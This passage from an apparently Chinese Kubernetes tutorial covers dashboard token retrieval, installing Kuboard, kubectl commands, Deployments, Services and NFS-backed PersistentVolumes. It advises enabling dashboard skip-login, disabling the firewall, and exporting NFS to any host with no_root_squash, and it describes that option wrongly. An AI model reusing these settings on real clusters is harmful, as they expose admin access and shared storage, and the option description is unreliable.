--serviceaccount=kube-system:dashboard-admin执行完以上操作后,由于管理用户的名称为dashboard-admin,生成的对应的secret的值则为dashboard-admin-token-随机字符串我的机器上完整名称为dashboard-admin-token-f99stkubectl get secret -n kube-system #查看token 查看token的具体信息 kubectl describe secret dashboard-admin-token-f99st -n kube-system 或者 1kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep dashboard-admin | awk '{print $1}') 开启跳过登陆 根据使用的版本不同,可能有的版本包含skip按钮,有的则不包含,在1.10.1里面默认不再显然skip按钮,其实dashboard安装有很多坑,如果有读者按照以上设置仍然不能正常成功登陆,但是仍然想要体验dashboard,可以开启默认关闭的skip按钮,这样就可以进入到dashboard管理界面了. 123456执行命令kubectl edit deploy -n=kube-system kubernetes-dashboard在containers下面的args栏里输入- --enable-skip-login 然后保存即可.刷新web页面,登陆界面就会多出一个skip按钮. 2.部署kuboard 网站文档地址 12https://kuboard.cn/install/install-dashboard.html 稳定版 123wget https://kuboard.cn/install-script/kuboard.yamlkubectl apply -f https://kuboard.cn/install-script/kuboard.yamlkubectl apply -f https://addons.kuboard.cn/metrics-server/0.3.6/metrics-server.yaml 查看 Kuboard 运行状态： 1kubectl get pods -l k8s.kuboard.cn/name=kuboard -n kube-system 输出结果如下所示： 12NAME READY STATUS RESTARTS AGEkuboard-54c9c4f6cb-6lf88 1/1 Running 0 45s 五.k8s常用命令集合1. 创建资源和删除一般创建资源会有两种方式：通过文件或者命令创建。 12345678# 通过文件创建一个Deploymentkubectl create -f /path/to/deployment.yamlcat /path/to/deployment.yaml | kubectl create -f -# 不过一般可能更常用下面的命令来创建资源kubectl apply -f /path/to/deployment.yaml# 通过kubectl命令直接创建kubectl run nginx_app --image=nginx:1.9.1 --replicas=3 kubectl还提供了一些更新资源的命令，比如kubectl edit、kubectl patch和kubectl replace等。 123456789# kubectl edit：相当于先用get去获取资源，然后进行更新，最后对更新后的资源进行applykubectl edit deployment/nginx_app# kubectl patch：使用补丁修改、更新某个资源的字段，比如更新某个nodekubectl patch node/node-0 -p '{\"spec\":{\"unschedulable\":true}}'kubectl patch -f node-0.json -p '{\"spec\": {\"unschedulable\": \"true\"}}'# kubectl replace：使用配置文件来替换资源kubectl replace -f /path/to/new_nginx_app.yaml 删除资源 1234567891011kubectl delete - 在 Pod 中的容器执行命令kubectl delete pod cali-2 -n calib批量删除namespace 是calib中 状态为Error的所有pod：kubectl get pods -n calib | grep Error | awk '{print $1}' | xargs kubectl delete pod -n calib（注意 “Error”，“Completed”状态得首字母都是大写哦）根据resource名或label删除resource。kubectl delete -f rc-nginx.yamlkubectl delete po rc-nginx-btv4jkubectl delete po -lapp=nginx-2 2. 查看资源获取不同种类资源的信息。 123456789101112131415161718192021222324252627282930# 一般命令的格式会如下：kubectl get &lt;resource_type&gt;# 比如获取K8s集群下pod的信息kubectl get pod# 更加详细的信息kubectl get pod -o wide#查看kube-apiserver的详细信息kubectl get pods -n kube-system kube-apiserver -o wide# 指定资源的信息，格式：kubectl get &lt;resource_type&gt;/&lt;resource_name&gt;，比如获取deployment nginx-deployment的信息kubectl get deployment/nginx-deployment -o wide #deployment表示部署， nginx-deployment表示部署的名字叫nginx-deployment# 也可以对指定的资源进行格式化输出，比如输出格式为json、yaml等kubectl get deployment/nginx-deployment -o jsonkubectl get deployment/nginx-deployment -o yaml# 还可以对输出结果进行自定义，比如对pod只输出容器名称和镜像名称kubectl get pods nginx-deployment-55d5bfd679-nlknm -o custom-columns=CONTAINER:.spec.containers[0].name,IMAGE:.spec.containers[0].image# 获取某个特定key的值还可以输入如下命令得到，此目录参照go template的用法，且命令结尾'\\n'是为了输出结果换行kubectl get pod nginx-deployment-55d5bfd679-nlknm -o template --template='{{(index spec.containers 0).name}}{{\"\\n\"}}'# 还有一些可选项可以对结果进行过滤，这儿就不一一列举了，如有兴趣，可参照kubectl get --help说明kubectl logs - 从 Pod 中的容器打印日志这个特殊一点哦，这个不用指定TYPE，因为kubeclt logs 默认就是pod类型，所以 kubectl logs pod 会报错，\"Error from server (NotFound): pods \"pod\" not found\"kubectl logs nginx-deployment-55d5bfd679-txglw 2.1, describe方法 describe类似于get，同样用于获取resource的相关信息。不同的是，get获得的是更详细的resource个性的详细信息，describe获得的是resource集群相关的信息。describe命令同get类似，但是describe不支持-o选项，对于同一类型resource，describe输出的信息格式，内容域相同。注：如果发现是查询某个resource的信息，使用get命令能够获取更加详尽的信息。但是如果想要查询某个resource的状态，如某个pod并不是在running状态，这时需要获取更详尽的状态信息时，就应该使用describe命令。 123kubectl describe po nginx-deployment-55d5bfd679-nlknm查询整个nginx的详细信息kubectl describe po nginx-deployment 3. 部署命令集部署命令包括资源的运行管理命令、扩容和缩容命令和自动扩缩容命令。 3.1 rollout命令 管理资源的运行，比如eployment、Daemonet、StatefulSet等资源。 查看部署状态：比如更新deployment/nginx_app中容器的镜像后查看其更新的状态。 12kubectl set image deployment/nginx-deployment nginx=nginx:1.9.1kubectl rollout status deployment/nginx-deployment 资源的暂停及恢复：发出一次或多次更新前暂停一个 Deployment，然后再恢复它，这样就能在Deployment暂停期间进行多次修复工作，而不会发出不必要的 rollout。 1234# 暂停kubectl rollout pause deployment/nginx-deployment# 完成所有的更新操作命令后进行恢复kubectl rollout resume deployment/nginx-deployment 回滚：如上对一个Deployment的image做了更新，但是如果遇到更新失败或误更新等情况时可以对其进行回滚。 1234567# 回滚之前先查看历史版本信息kubectl rollout history deployment/nginx-deployment# 回滚kubectl rollout undo deployment/nginx-deployment# 当然也可以指定版本号回滚至指定版本 kubectl rollout undo deployment/nginx-deployment --to-revision=&lt;version_index&gt; 3.2 scale命令 对一个Deployment、RS、StatefulSet进行扩/缩容。 12345# 扩容kubectl scale deployment/nginx-deployment --replicas=5# 如果是缩容，把对应的副本数设置的比当前的副本数小即可# 另外，还可以针对当前的副本数目做条件限制，比如当前副本数是5则进行缩容至副本数目为3kubectl scale --current-replicas=5 --replicas=3 deployment/nginx-deployment 3.3 autoscale命令 通过创建一个autoscaler，可以自动选择和设置在K8s集群中Pod的数量。 12# 基于CPU的使用率创建3-10个podkubectl autoscale deployment/nginx-deployment --min=3 --max=10 --cpu_percent=80 3.4replace更新替换资源 123456replace命令用于对已有资源进行更新、替换。如前面create中创建的nginx，当我们需要更新resource的一些属性的时候，如果修改副本数量，增加、修改label，更改image版本，修改端口等。都可以直接修改原yaml文件，然后执行replace命令。注：名字不能被更新。另外，如果是更新label，原有标签的pod将会与更新label后的rc断开联系，有新label的rc将会创建指定副本数的新的pod，但是默认并不会删除原来的pod。所以此时如果使用get po将会发现pod数翻倍，进一步check会发现原来的pod已经不会被新rc控制，此处只介绍命令不详谈此问题，好奇者可自行实验。kubectl replace -f deployment.yml加个参数--force 先删除后再部署kubectl replace --force -f deployment.yml 4. 集群管理命令4.1 cordon &amp; uncordon命令 设置是否能够将pod调度到该节点上。 123456789101112131415161718先查看节点当前信息kubectl get pod -n kube-system -o wide# 不可调度kubectl cordon k8snode1此时节点信息会发生变化NAME STATUS ROLES AGE VERSIONk8smaster Ready master 140m v1.18.4k8snode1 Ready,SchedulingDisabled &lt;none&gt; 131m v1.18.4k8snode2 Ready &lt;none&gt; 131m v1.18.4#看到k8snode1状态发了了变化# 当某个节点需要维护时，可以驱逐该节点上的所有pods(会删除节点上的pod，并且自动通过上面命令设置# 该节点不可调度，然后在其他可用节点重新启动pods)kubectl drain k8snode1# 待其维护完成后，可再设置该节点为可调度kubectl uncordon k8snode1#这时候k8snode1状态恢复成Ready了 4.2 taint命令 目前仅能作用于节点资源，一般这个命令通常会结合pod的tolerations字段结合使用，对于没有设置对应toleration的pod是不会调度到有该taint的节点上的，这样就可以避免pod被调度到不合适的节点上。一个节点的taint一般会包括key、value和effect(effect只能在NoSchedule, PreferNoSchedule, NoExecute中取值)。 1234# 设置taintkubectl taint nodes k8snode1 key1=value1:NoSchedule# 移除taintkubectl taint nodes k8snode1 key1:NoSchedule 如果pod想要被调度到上述设置了taint的节点node-0上，则需要在该pod的spec的tolerations字段设置： 1234567891011tolerations:- key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoSchedule\"# 或者tolerations:- key: \"key1\" operator: \"Exists\" effect: \"NoSchedule\" 5. 其它123456789101112131415161718192021222324252627# 映射端口允许外部访问kubectl expose deployment/nginx-deployment --type='NodePort' --port=80# 然后通过kubectl get services -o wide来查看被随机映射的端口我的是80:32118/TCP# 如此就可以通过node的外部IP和端口来访问nginx服务了,http://192.168.224.12:32118/#也可以手动指定svc的端口kubectl expose deployment nginx --name nginx-svc --protocol TCP --port 8000 --target-port 80 --type NodePort# 转发本地端口访问Pod的应用服务程序kubectl port-forward nginx-deployment-89bc67794-6vsc7 8090:80# 如此，本地可以访问：curl -i localhost:8090# 在创建或启动某些资源的时候没有达到预期结果，可以使用如下命令先简单进行故障定位kubectl describe deployment/nginx-deploymentkubectl logs nginx-deployment-89bc67794-6vsc7kubectl exec deployment/nginx-deployment -c nginx &lt;command&gt;kubectl exec deployment/nginx-deployment ls /etc/nginx# 集群内部调用接口(比如用curl命令)，可以采用代理的方式，根据返回的ip及端口作为baseurlkubectl proxy &amp;# 查看K8s支持的完整资源列表kubectl api-resources# 查看K8s支持的api版本kubectl api-versions 部署管理k8s一.k8s部署第一个pod应用Pod的状态描述 123456状态值 描述Pending API Server已经创建该Pod，但在Pod内还有一个或多个容器的镜像没有创建，包括正在下载镜像的过程。Runnung Pod内所有容器均已创建，且至少有一个容器处于运行状态、正在启动状态或正在重启状态。Succeeded Pod内所有容器均成功执行后退出，且不会再重启。Failed Pod内所有容器均已退出，但至少有一个容器退出为失败状态。Unknown 由于某种原因无法获取该Pod的状态，可能由于网络通信不畅导致。 1.编写一个pod.yaml文件查看yaml编写文档每个字段的意思 kubectl explain deployment.spec 1234567891011121314151617---apiVersion: v1kind: Podmetadata: name: kube100-site labels: app: webspec: containers: - name: front-end image: nginx ports: - containerPort: 80 - name: flaskapp-demo image: jcdemo/flaskapp ports: - containerPort: 5000 然后通过命令创建 123kubectl create -f pod.yamlpod &quot;kube100-site&quot; created 然后我们就可以使用我们前面比较熟悉的 kubectl 命令来查看 POD 的状态了： 12345$ kubectl get pods -o wide 查看到了ip 可以分别访问80端口和5000端口curl -i 10.244.2.17curl -i 10.244.2.17:5000 如果有问题也可以删除 1kubectl delete -f pod.yaml 2.API部署例子我们使用kubectl run来运行我们的第一个应用 ，run命令用于新建一个部署。我们需要提供部署名称和应用镜像地址（DockerHub以外的镜像需要全路径）作为参数。通过–port参数，还可以指定app使用的端口。 1234567kubectl run kubernetes-bootcamp --image=docker.io/jocatalin/kubernetes-bootcamp:v1 --port=8080具体后台的操作包括：查找适合这个应用运行的node调度这个应用在选定的node上运行配置集群，在需要的时候为这个应用调配新的node 查看应用部署情况。 123kubectl get deploymentskubectl get pods 查看应用在Kubernetes中，pod运行于私有的、隔离的网络。默认情况下，Pod对集群内的其他pod和服务是可见的，但对网络外部是不可见的。我们在使用kubectl时，实际上是通过API端点(endpoint)（可以理解为URL）与应用进行交互。通过kubectl proxy可以创建一个代理，让你能与集群内的私有网络进行通讯。代理运行过程中没有任何输出，按Ctrl+C可以关闭代理程序。重新打开一个终端运行代理程序 1kubectl proxy 这样就建立了一条从本地主机到集群的连接，代理程序允许从终端直接访问API。通过代理端点，你可以查看所有的API，端点地址是：http://localhost:8001。你可以通过curl命令直接查看： 1curl http://localhost:8001/version 12345678910API服务器自动为每个pod建立同名的API端点，而且这些端点可以通过代理访问。首先获取Pod名称存储到POD_NAME中：$ export POD_NAME=$(kubectl get pods -o go-template --template '{{range .items}}{{.metadata.name}}{{&quot;\\n&quot;}}{{end}}')$ echo Name of the Pod: $POD_NAMEName of the Pod: kubernetes-bootcamp-390780338-x81xj 然后向pod中运行的应用发送一个http请求，这个url就指向了Pod的API。$ curl http://localhost:8001/api/v1/proxy/namespaces/default/pods/kubernetes-bootcamp-5d7f968ccb-n5vqb/Hello Kubernetes bootcamp! | Running on: kubernetes-bootcamp-390780338-x81xj | v=1注意：命令行中的参数“kubernetes-bootcamp-5d7f968ccb-dtdv5”，要从“echo POD_NAME”中获得。 二.k8s部署RC和RS应用Replication Controller RC是定义一个期望的场景，声明某种Pod的副本数量在任意时刻都符合某个预期值，所以RC的定义包括如下几个部分： Pod期待的副本数量。 用于筛选目标Pod的Label Selector。 当Pod的副本数量小于预期数量时，用于创建新Pod的Pod模板（templete）。 Replication Controller简称RC，RC是Kubernetes系统中的核心概念之一，简单来说，RC可以保证在任意时间运行Pod的副本数量，能够保证Pod总是可用的。如果实际Pod数量比指定的多那就结束掉多余的，如果实际数量比指定的少就新启动一些Pod，当Pod失败、被删除或者挂掉后，RC都会去自动创建新的Pod来保证副本数量，所以即使只有一个Pod，我们也应该使用RC来管理我们的Pod。 现在我们来使用RC来管理我们前面使用的Nginx的Pod，YAML文件如下： 1234567891011121314151617181920apiVersion: v1kind: ReplicationControllermetadata: name: rc-demo labels: name: rcspec: replicas: 3 selector: #可选 name: rc template: metadata: labels: name: rc spec: containers: - name: nginx-demo image: nginx ports: - containerPort: 80 上面的YAML文件相对于我们之前的Pod的格式： kind：ReplicationController spec.replicas: 指定Pod副本数量，默认为1 spec.selector: RC通过该属性来筛选要控制的Pod spec.template: 这里就是我们之前的Pod的定义的模块，但是不需要apiVersion和kind了 spec.template.metadata.labels: 注意这里的Pod的labels要和spec.selector相同，这样RC就可以来控制当前这个Pod了。 这个YAML文件中的意思就是定义了一个RC资源对象，它的名字叫rc-demo，保证一直会有3个Pod运行，Pod的镜像是nginx镜像。 12注意spec.selector和spec.template.metadata.labels这两个字段必须相同，否则会创建失败的，当然我们也可以不写spec.selector，这样就默认与Pod模板中的metadata.labels相同了。然后我们来创建上面的RC对象(保存为 rc-demo.yaml): 123456789101112131415161718kubectl create -f rc-demo.yaml 查看RC：kubectl get rc查看具体信息：kubectl describe rc rc-demo然后我们通过RC来修改下Pod的副本数量为2：kubectl apply -f rc-demo.yaml或者kubectl edit rc rc-demo最新的k8s貌似已经不支持rolling-update命令了而且我们还可以用RC来进行滚动升级，比如我们将镜像地址更改为nginx:1.7.9:kubectl rolling-update rc-demo --image=nginx:1.7.9但是如果我们的Pod中多个容器的话，就需要通过修改YAML文件来进行修改了:kubectl rolling-update rc-demo -f rc-demo.yaml如果升级完成后出现了新的问题，想要一键回滚到上一个版本的话，使用RC只能用同样的方法把镜像地址替换成之前的，然后重新滚动升级。 Replication Set（RS） Replication Set简称RS，随着Kubernetes的高速发展，官方已经推荐我们使用RS和Deployment来代替RC了，实际上RS和RC的功能基本一致，目前唯一的一个区别就是RC只支持基于等式的selector（env=dev或environment!=qa），但RS还支持基于集合的selector（version in (v1.0, v2.0)），这对复杂的运维管理就非常方便了。 kubectl命令行工具中关于RC的大部分命令同样适用于我们的RS资源对象。不过我们也很少会去单独使用RS，它主要被Deployment这个更加高层的资源对象使用，除非用户需要自定义升级功能或根本不需要升级Pod，在一般情况下，我们推荐使用Deployment而不直接使用Replica Set。 最后总结下关于RC/RS的一些特性和作用吧： 大部分情况下，我们可以通过定义一个RC实现的Pod的创建和副本数量的控制 RC中包含一个完整的Pod定义模块（不包含apiversion和kind） RC是通过label selector机制来实现对Pod副本的控制的 通过改变RC里面的Pod副本数量，可以实现Pod的扩缩容功能 通过改变RC里面的Pod模板中镜像版本，可以实现Pod的滚动升级功能（但是不支持一键回滚，需要用相同的方法去修改镜像地址） 三.k8s部署deployment和SVC1.DeploymentDeployment同样也是Kubernetes系统的一个核心概念，主要职责和RC一样的都是保证Pod的数量和健康，二者大部分功能都是完全一致的，我们可以看成是一个升级版的RC控制器，那Deployment又具备那些新特性呢？ RC的全部功能：Deployment具备RC的全部功能 事件和状态查看：可以查看Deployment的升级详细进度和状态 回滚：当升级Pod的时候如果出现问题，可以使用回滚操作回滚到之前的任一版本 版本记录：每一次对Deployment的操作，都能够保存下来，这也是保证可以回滚到任一版本的基础 暂停和启动：对于每一次升级都能够随时暂停和启动 作为对比，我们知道Deployment作为新一代的RC，不仅在功能上更为丰富了，同时我们也说过现在官方也都是推荐使用Deployment来管理Pod的，比如一些官方组件kube-dns、kube-proxy也都是使用的Deployment来管理的，所以当大家在使用的使用也最好使用Deployment来管理Pod。 可以看出一个Deployment拥有多个Replica Set，而一个Replica Set拥有一个或多个Pod。一个Deployment控制多个RS主要是为了支持回滚机制，每当Deployment操作时，Kubernetes会重新生成一个Replica Set并保留，以后有需要的话就可以回滚至之前的状态。 下面创建一个Deployment，它创建了一个Replica Set来启动3个nginx pod，yaml文件如下： 123456789101112131415161718apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: nginx-deploy labels: k8s-app: nginx-demospec: replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 这里需要注意: 12apiVersion: extensions/v1beta1 kind: Deployment 此部署版本已被弃用，并且在k8s的最新版本（例如1.16）中不再可用。 现在，您必须指定apiVersion: apps/v1并略微修改模板（需要selector.matchLabels字段）。并且与Pod模板中的metadata.labels相同 123456789101112131415161718192021apiVersion: apps/v1kind: Deploymentmetadata: name: nginx-deploy labels: k8s-app: nginx-demospec: selector: #新增这个字段 matchLabels: app: nginx #名字和下面的pod模板的labels名相同 replicas: 3 template: metadata: labels: app: nginx #和这里的相同 spec: containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 将上面内容保存为: nginx-deployment.yaml，执行命令: 12345$ kubectl create -f nginx-deployment.yamldeployment \"nginx-deploy\" created查看deployment$ kubectl get deployments 可以看到Deployment已经创建了1个Replica Set了，执行下面的命令查看rs和pod: 123$ kubectl get rs$ kubectl get pod --show-labels 上面的Deployment的yaml文件中的replicas:3将会保证我们始终有3个POD在运行 下面是通过Deployment部署的 方法一：通过控制台部署。 部署Nginx到 K8S集群中：进入 控制台-&gt; 工作负载-&gt; 点击链接“➕创建”位于网页左上角 。复制如下代码来从云服务器自动下载nginx镜像。 12345678910111213141516171819apiVersion: apps/v1 # for versions before 1.9.0 use apps/v1beta2kind: Deploymentmetadata: name: nginx-deploymentspec: selector: matchLabels: app: nginx replicas: 2 # tells deployment to run 2 pods matching the template template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 方法二：通过命令行部署 121. 将内容保存为 yml文件。2. 执行命令：kubectl create -f deployment.yml --save-config 在Nginx部署完成后，在Master执行下面的命令，确保docker有部署到集群上 123456789101112kubectl get pods -o wide 可以内部访问curl -I 10.244.1.3通过leber查看pod的详细情况kubectl get pods -o wide -l app=nginx删除应用kubectl delete pods -l app=nginx 这里删除后马上又会开启两个.kubectl delete pods nginx-deployment-5bf87f5f59-8vbtk 查看应用部署情况 1234kubectl get deployments 查看节点IPkubectl get svc 12将Docker中的虚拟机暴露在网络中kubectl expose deployment nginx-deployment --type=&quot;LoadBalancer&quot; 查看Docker镜像在主节点的映射端口。本例中：镜像为80端口，映射到主节点的32118端口上。 1kubectl get services 查看资源的详细信息 1kubectl describe pods nginx 2.ServiceService是一种抽象的对象，它定义了一组Pod的逻辑集合和一个用于访问它们的策略，一个Serivce下面包含的Pod集合一般是由Label Selector来决定的。假如我们后端运行了3个副本，这些副本都是可以替代的，因为前端并不关心它们使用的是哪一个后端服务。尽管由于各种原因后端的Pod集合会发生变化，但是前端却不需要知道这些变化，也不需要自己用一个列表来记录这些后端的服务，Service的这种抽象就可以帮我们达到这种解耦的目的。 三种ip 123Node IP：Node节点的IP地址Pod IP：Pod的IP地址Cluster IP：Service的IP地址 首先，Node IP是Kubernetes集群中节点的物理网卡IP地址(一般为内网)，所有属于这个网络的服务器之间都可以直接通信，所以Kubernetes集群外要想访问Kubernetes集群内部的某个节点或者服务，肯定得通过Node IP进行通信（这个时候一般是通过外网IP了） 然后Pod IP是每个Pod的IP地址，它是Docker Engine根据docker0网桥的IP地址段进行分配的（我们这里使用的是flannel这种网络插件保证所有节点的Pod IP不会冲突） 最后Cluster IP是一个虚拟的IP，仅仅作用于Kubernetes Service这个对象，由Kubernetes自己来进行管理和分配地址，当然我们也无法ping这个地址，他没有一个真正的实体对象来响应，他只能结合Service Port来组成一个可以通信的服务。 定义Service 定义Service的方式和各种资源对象的方式类型一样，假定我们有一组Pod服务，它们对外暴露了 80 端口，同时都被打上了app=myapp这样的标签，那么我们就可以像下面这样来定义一个Service对象： pod示例： 12345678910111213141516171819apiVersion: apps/v1kind: Deploymentmetadata: name: testspec: selector: matchLabels: app: myapp replicas: 3 template: metadata: labels: app: myapp spec: containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 service基于pod的示例： 1234567891011apiVersion: v1kind: Servicemetadata: name: myservicespec: selector: app: myapp ports: - protocol: TCP port: 80 targetPort: 80 然后通过的使用kubectl create -f myservice.yaml就可以创建一个名为myservice的Service对象，它会将请求代理到使用 TCP 端口为 80，具有标签app=myapp的Pod上，这个Service会被系统分配一个我们上面说的Cluster IP，该Service还会持续的监听selector下面的Pod，会把这些Pod信息更新到一个名为myservice的Endpoints对象上去，这个对象就类似于我们上面说的Pod集合了。 需要注意的是，Service能够将一个接收端口映射到任意的targetPort。 默认情况下，targetPort将被设置为与port字段相同的值。 可能更有趣的是，targetPort 可以是一个字符串，引用了 backend Pod 的一个端口的名称。 因实际指派给该端口名称的端口号，在每个 backend Pod 中可能并不相同，所以对于部署和设计 Service ，这种方式会提供更大的灵活性。 另外Service能够支持 TCP 和 UDP 协议，默认是 TCP 协议。 kube-proxy 在Kubernetes集群中，每个Node会运行一个kube-proxy进程, 负责为Service实现一种 VIP（虚拟 IP，就是我们上面说的clusterIP）的代理形式，现在的Kubernetes中默认是使用的iptables这种模式来代理。这种模式，kube-proxy会监视Kubernetes master对 Service 对象和 Endpoints 对象的添加和移除。 对每个 Service，它会添加上 iptables 规则，从而捕获到达该 Service 的 clusterIP（虚拟 IP）和端口的请求，进而将请求重定向到 Service 的一组 backend 中的某一个个上面。 对于每个 Endpoints 对象，它也会安装 iptables 规则，这个规则会选择一个 backend Pod。 默认的策略是，随机选择一个 backend。 我们也可以实现基于客户端 IP 的会话亲和性，可以将 service.spec.sessionAffinity 的值设置为 “ClientIP” （默认值为 “None”）。 另外需要了解的是如果最开始选择的 Pod 没有响应，iptables 代理能够自动地重试另一个 Pod，所以它需要依赖 readiness probes。 Service 类型 在定义Service的时候可以指定一个自己需要的类型的Service，如果不指定的话默认是ClusterIP类型。 可以使用的服务类型如下： 1、ClusterIP：通过集群的内部 IP 暴露服务，选择该值，服务只能够在集群内部可以访问，这也是默认的ServiceType。 2、NodePort：通过每个 Node 节点上的 IP 和静态端口（NodePort）暴露服务。NodePort 服务会路由到 ClusterIP 服务，这个 ClusterIP 服务会自动创建。通过请求 :，可以从集群的外部访问一个 NodePort 服务。 3、LoadBalancer：使用云提供商的负载局衡器，可以向外部暴露服务。外部的负载均衡器可以路由到 NodePort 服务和 ClusterIP 服务，这个需要结合具体的云厂商进行操作。 4、ExternalName：通过返回 CNAME 和它的值，可以将服务映射到 externalName 字段的内容（例如， foo.bar.example.com）。没有任何类型代理被创建，这只有 Kubernetes 1.7 或更高版本的 kube-dns 才支持。 NodePort 类型 如果设置 type 的值为 “NodePort”，Kubernetes master 将从给定的配置范围内（默认：30000-32767）分配端口，每个 Node 将从该端口（每个 Node 上的同一端口）代理到 Service。该端口将通过 Service 的 spec.ports[*].nodePort 字段被指定，如果不指定的话会自动生成一个端口。 需要注意的是，Service 将能够通过 :spec.ports[].nodePort 和 spec.clusterIp:spec.ports[].port 而对外可见。 接下来创建一个NodePort的服务 1234567891011121314apiVersion: v1kind: Servicemetadata: name: myservicespec: selector: app: myapp type: NodePort ports: - protocol: TCP port: 80 targetPort: 80 name: myapp-http nodePort: 32560 创建该Service: 123$ kubectl create -f service-demo.yaml注意上面有创建myservice服务的需要删掉 然后我们可以查看Service对象信息： 1234$ kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 22hmyservice NodePort 10.100.114.118 &lt;none&gt; 80:32560/TCP 8s 可以看到myservice的 TYPE 类型已经变成了NodePort，后面的PORT(S)部分也多了一个 32560 的随机映射端口。 ExternalName ExternalName 是 Service 的特例，它没有 selector，也没有定义任何的端口和 Endpoint。 对于运行在集群外部的服务，它通过返回该外部服务的别名这种方式来提供服务。 12345678kind: ServiceapiVersion: v1metadata: name: my-service namespace: prodspec: type: ExternalName externalName: my.database.example.com 当查询主机 my-service.prod.svc.cluster.local 时，集群的 DNS 服务将返回一个值为 my.database.example.com 的 CNAME 记录。 访问这个服务的工作方式与其它的相同，唯一不同的是重定向发生在 DNS 层，而且不会进行代理或转发。 如果后续决定要将数据库迁移到 Kubernetes 集群中，可以启动对应的 Pod，增加合适的 Selector 或 Endpoint，修改 Service 的 type，完全不需要修改调用的代码，这样就完全解耦了。 3.1.网站服务应用在控制台中创建 应用一 12345678910111213apiVersion: v1kind: Servicemetadata: name: resultspec: type: NodePort ports: - name: &quot;result-service&quot; port: 5001 targetPort: 80 nodePort: 31001 selector: app: result 应用二 1234567891011121314151617181920212223apiVersion: apps/v1kind: Deploymentmetadata: name: result namespace: default labels: env: test app: resultspec: selector: matchLabels: app: result replicas: 2 template: metadata: name: result-pod labels: app: result env: test spec: containers: - image: dockersamples/examplevotingapp_result:before name: result 查看是否运行 1kubectl get pods 四.k8s部署PV的应用概念 PV 的全称是：PersistentVolume（持久化卷），是对底层的共享存储的一种抽象，PV 由管理员进行创建和配置，它和具体的底层的共享存储技术的实现方式有关，比如 Ceph、GlusterFS、NFS 等，都是通过插件机制完成与共享存储的对接。 NFS方式1、关闭防火墙 12$ systemctl stop firewalld.service$ systemctl disable firewalld.service 2、安装配置 nfs 1$ yum -y install nfs-utils rpcbind 3、共享目录设置权限： 12 mkdir /data/k8s -p$ chmod 755 /data/k8s/ 4、配置 nfs，nfs 的默认配置文件在 /etc/exports 文件下，在该文件中添加下面的配置信息： 12$ vim /etc/exports/data/k8s *(rw,sync,no_root_squash) 5、配置说明： /data/k8s：是共享的数据目录 *：表示任何人都有权限连接，当然也可以是一个网段，一个 IP，也可以是域名 rw：读写的权限 sync：表示文件同时写入硬盘和内存 no_root_squash：当登录 NFS 主机使用共享目录的使用者是 root 时，其权限将被转换成为匿名使用者，通常它的 UID 与 GID，都会变成 nobody 身份 启动服务 nfs 需要向 rpc 注册，rpc 一旦重启了，注册的文件都会丢失，向他注册的服务都需要重启 注意启动顺序，先启动 rpcbind 12345 systemctl start rpcbind.service systemctl enable rpcbind systemctl status rpcbind状态信息是正在运行的 看到上面的 Started 证明启动成功了。 然后启动 nfs 服务： 123systemctl start nfs.servicesystemctl enable nfssystemctl status nfs 同样看到 Started 则证明 NFS Server 启动成功了。 另外还可以通过下面的命令确认下： 1234567$ rpcinfo -p|grep nfs 100003 3 tcp 2049 nfs 100003 4 tcp 2049 nfs 100227 3 tcp 2049 nfs_acl 100003 3 udp 2049 nfs 100003 4 udp 2049 nfs 100227 3 udp 2049 nfs_acl 查看具体目录挂载权限： 12$ cat /var/lib/nfs/etab/data/k8s *(rw,sync,wdelay,hide,nocrossmnt,secure,no_root_squash,no_all_squash,no_subtree_check,secure_locks,acl,no_pnfs,anonuid=65534,anongid=65534,sec=sys,secure,no_root_squash,no_all_squash) 到这里nfs server就安装成功了，接下来我们在节点192.168.224.11和12上来安装 nfs 的客户端来验证下 nfs 安装 nfs 当前也需要先关闭防火墙： 12systemctl stop firewalld.servicesystemctl disable firewalld.service 然后安装 nfs 1yum -y install nfs-utils rpcbind 安装完成后，和上面的方法一样，先启动 rpc、然后启动 nfs： 1234systemctl start rpcbind.service systemctl enable rpcbind.service systemctl start nfs.service systemctl enable nfs.service 挂载数据目录 客户端启动完成后，我们在客户端来挂载下 nfs 测试下： 首先检查下 nfs 是否有共享目录： 1234showmount -e 192.168.224.10Export list for 192.168.224.10:/data/k8s * 然后我们在客户端上新建目录： 1$ mkdir /data 将 nfs 共享目录挂载到上面的目录： 1mount -t nfs 192.168.224.10:/data/k8s /data 挂载成功后，在客户端上面的目录中新建一个文件，然后我们观察下 nfs 服务端的共享目录下面是否也会出现该文件： 1$ touch /data/test.txt 然后在 nfs 服务端查看： 123$ ls -ls /data/k8s/total 40 -rw-r--r-- 1 root root 0 6月 24 02:41 test.txt 如果上面出现了 test.txt 的文件，那么证明我们的 nfs 挂载成功了。 PV有了上面的 NFS 共享存储，下面我们就可以来使用 PV 和 PVC 了。PV 作为存储资源，主要包括存储能力、访问模式、存储类型、回收策略等关键信息，下面我们来新建一个 PV 对象，使用 nfs 类型的后端存储，1G 的存储空间，访问模式为 ReadWriteOnce，回收策略为 Recyle，对应的 YAML 文件如下：(pv1-demo.yaml) 12345678910111213apiVersion: v1kind: PersistentVolumemetadata: name: pv1spec: capacity: storage: 1Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Recycle nfs: path: /data/k8s server: 192.168.224.10 Kubernetes 支持的 PV 类型有很多，比如常见的 Ceph、GlusterFs、NFS，甚至 HostPath也可以，不过 HostPath 仅仅可以用于单机测试，更多的支持类型可以前往 Kubernetes PV 官方文档进行查看，因为每种存储类型都有各自的特点，所以我们在使用的时候可以去查看相应的文档来设置对应的参数。 然后同样的，直接使用 kubectl 创建即可： 123456$ kubectl create -f pv1-demo.yamlpersistentvolume \"pv1\" created $ kubectl get pvNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGEpv1 1Gi RWO Recycle Available 我们可以看到 pv1 已经创建成功了，状态是 Available，表示 pv1 就绪，可以被 PVC 申请。我们来分别对上面的属性进行一些解读。 capacity(存储能力) 一般来说，一个 PV 对象都要指定一个存储能力，通过 